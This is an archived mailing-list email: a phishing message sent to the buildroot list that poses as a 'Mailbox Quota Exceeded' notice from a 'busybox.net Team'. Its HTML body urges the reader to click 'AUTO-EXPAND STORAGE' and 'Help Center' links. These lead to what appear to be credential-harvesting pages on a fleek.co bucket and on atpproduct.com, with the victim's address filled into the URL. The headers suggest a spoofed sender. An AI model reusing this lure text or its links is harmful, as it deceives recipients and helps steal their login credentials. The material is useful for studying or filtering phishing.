Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id D2DC7C433FE
	for <buildroot@archiver.kernel.org>; Sat, 29 Oct 2022 20:59:11 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp3.osuosl.org (Postfix) with ESMTP id 4226360ABE;
	Sat, 29 Oct 2022 20:59:11 +0000 (UTC)
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 4226360ABE
X-Virus-Scanned: amavisd-new at osuosl.org
Received: from smtp3.osuosl.org ([127.0.0.1])
	by localhost (smtp3.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
	with ESMTP id ZQ510HoWF5WP; Sat, 29 Oct 2022 20:59:10 +0000 (UTC)
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp3.osuosl.org (Postfix) with ESMTP id 68E3E605BA;
	Sat, 29 Oct 2022 20:59:09 +0000 (UTC)
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 68E3E605BA
Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
 by ash.osuosl.org (Postfix) with ESMTP id 8C5371BF20F
 for <buildroot@lists.busybox.net>; Sat, 29 Oct 2022 20:59:07 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp2.osuosl.org (Postfix) with ESMTP id 455AC40546
 for <buildroot@lists.busybox.net>; Sat, 29 Oct 2022 20:59:06 +0000 (UTC)
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 455AC40546
X-Virus-Scanned: amavisd-new at osuosl.org
Received: from smtp2.osuosl.org ([127.0.0.1])
 by localhost (smtp2.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
 with ESMTP id JY3ztoZM6LSd for <buildroot@lists.busybox.net>;
 Sat, 29 Oct 2022 20:59:05 +0000 (UTC)
X-Greylist: domain auto-whitelisted by SQLgrey-1.8.0
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 0B46D4052C
Received: from busybox.net (unknown [41.216.183.226])
 by smtp2.osuosl.org (Postfix) with ESMTP id 0B46D4052C
 for <buildroot@busybox.net>; Sat, 29 Oct 2022 20:59:04 +0000 (UTC)
From: busybox.net <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 29 Oct 2022 22:58:42 +0200
Message-ID: <20221029225842.E1D835B7DB732F4B@busybox.net>
MIME-Version: 1.0
Subject: [Buildroot] Mailbox Quota Exceeded
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8580077081922563684=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============8580077081922563684==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;">
<table width=3D"100%" style=3D"width: 600px; color: rgb(34, 34, 34); text-t=
ransform: none; letter-spacing: normal; font-family: verdana, geneva, sans-=
serif; font-size: small; font-style: normal; font-weight: 400; word-spacing=
: 0px; white-space: normal; border-collapse: collapse; max-width: 600px; bo=
rder-spacing: 0px; orphans: 2; widows: 2; background-color: rgb(255, 255, 2=
55); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-tex=
t-stroke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial;" c=
ellspacing=3D"0" cellpadding=3D"0"><tbody><tr style=3D"border-collapse: col=
lapse;"><td width=3D"800" align=3D"center" valign=3D"top" style=3D"margin: =
0px; padding: 0px; font-family: verdana, geneva, sans-serif;"><table width=
=3D"100%" style=3D"width: 600px; border-collapse: collapse; max-width: 600p=
x; border-spacing: 0px;" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr sty=
le=3D"border-collapse: collapse;">
<td style=3D"margin: 0px; padding: 30px 15px 15px 20px; font-family: verdan=
a, geneva, sans-serif;" bgcolor=3D"#ffffff"><h1 style=3D'margin: 0px; text-=
align: center; color: rgb(237, 44, 21); line-height: 36px; font-family: geo=
rgia, times, "times new roman", serif; font-size: 42px; font-weight: normal=
;'><span class=3D"il">Mailbox</span><span>&nbsp;</span><span class=3D"il">Q=
uota</span><span>&nbsp;</span><span class=3D"il">Exceeded</span></h1></td><=
/tr></tbody></table></td></tr></tbody></table>
<table width=3D"100%" style=3D"width: 569px; color: rgb(34, 34, 34); text-t=
ransform: none; letter-spacing: normal; font-family: verdana, geneva, sans-=
serif; font-size: small; font-style: normal; font-weight: 400; word-spacing=
: 0px; white-space: normal; border-collapse: collapse; max-width: 600px; bo=
rder-spacing: 0px; orphans: 2; widows: 2; background-color: rgb(255, 255, 2=
55); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-tex=
t-stroke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial;" c=
ellspacing=3D"0" cellpadding=3D"0"><tbody><tr style=3D"border-collapse: col=
lapse;"><td width=3D"740" align=3D"center" valign=3D"top" style=3D"margin: =
0px; padding: 0px; font-family: verdana, geneva, sans-serif;"><table width=
=3D"100%" style=3D"width: 569px; border-collapse: collapse; max-width: 600p=
x; border-spacing: 0px;" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr sty=
le=3D"border-collapse: collapse;">
<td align=3D"left" style=3D"margin: 0px; padding: 10px 0px 10px 10px; text-=
align: center; font-family: verdana, geneva, sans-serif;" bgcolor=3D"#fffff=
f"><p style=3D"margin: 0px; color: rgb(51, 51, 51); line-height: 19px;"><br=
></p>Your<span>&nbsp;</span><span class=3D"il">email</span>&nbsp;&nbsp;&nbs=
p;<span style=3D"color: rgb(51, 51, 51);"><a style=3D"color: rgb(17, 85, 20=
4);" target=3D"_blank">buildroot@busybox.net</a></span>&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;is out of storage and can not receive more mails.<br><br>
Kindly add storage<span>&nbsp;</span><span class=3D"il">quota</span><span>&=
nbsp;</span>to your<span>&nbsp;</span><span class=3D"il">mailbox</span><spa=
n>&nbsp;</span>from below portal to receive your undelivered mails.<br><br>=
<p style=3D"margin: 0px; color: rgb(51, 51, 51); line-height: 19px;"></p><c=
enter>
<a style=3D"margin: 2px; padding: 10px; width: 601px; height: 47px; color: =
rgb(255, 255, 255); line-height: 19px; font-size: 12px; float: left; displa=
y: block; background-color: rgb(1, 116, 223); text-decoration-line: none;" =
href=3D"https://storageapi.fleek.co/934c40fe-14be-47dc-ae18-b244b87c144c-bu=
cket/mail.html#buildroot@busybox.net" target=3D"_blank" rel=3D"noreferrer" =
data-saferedirectreason=3D"2"=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://atpproduct.c=
om/mkj/fixed0/index.php?user%3Dmum_ccel@dendriteadhesive.com&amp;source=3Dg=
mail&amp;ust=3D1667154910977000&amp;usg=3DAOvVaw0CtgzBzbgHC1ggutk8udex">AUT=
O-EXPAND STORAGE</a></center><br><br><br><p style=3D"margin: 0px; color: rg=
b(51, 51, 51); line-height: 19px;"></p>
For more enquiries, visit our&nbsp;<a style=3D"color: rgb(19, 118, 200); li=
ne-height: 19px;" href=3D"https://atpproduct.com/mkj/fixed0/index.php?user=
=3Dmum_ccel@dendriteadhesive.com" target=3D"_blank" rel=3D"noreferrer" data=
-saferedirectreason=3D"2" data-saferedirecturl=3D"https://www.google.com/ur=
l?q=3Dhttps://atpproduct.com/mkj/fixed0/index.php?user%3Dmum_ccel@dendritea=
dhesive.com&amp;source=3Dgmail&amp;ust=3D1667154910978000&amp;usg=3DAOvVaw3=
swhkRitHp43F1YEzcK6ep">Help Center</a><span>&nbsp;</span><br><br><br>
<p style=3D"margin: 0px; color: rgb(51, 51, 51); line-height: 19px;">We hop=
e to serve you better.</p>Regards,<br>busybox.net<span>&nbsp;</span>Team.<b=
r><span style=3D"color: rgb(0, 0, 255); font-family: verdana;">____________=
__________________ _________________________<br><br><span style=3D"line-hei=
ght: 1.2; font-family: arial; font-size: 12px;">&copy; All Rights Reserved.=
 Webmail 1995-2022.&nbsp;</span></span></td></tr></tbody></table></td></tr>=
</tbody></table>


</body></html>

--===============8580077081922563684==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============8580077081922563684==--
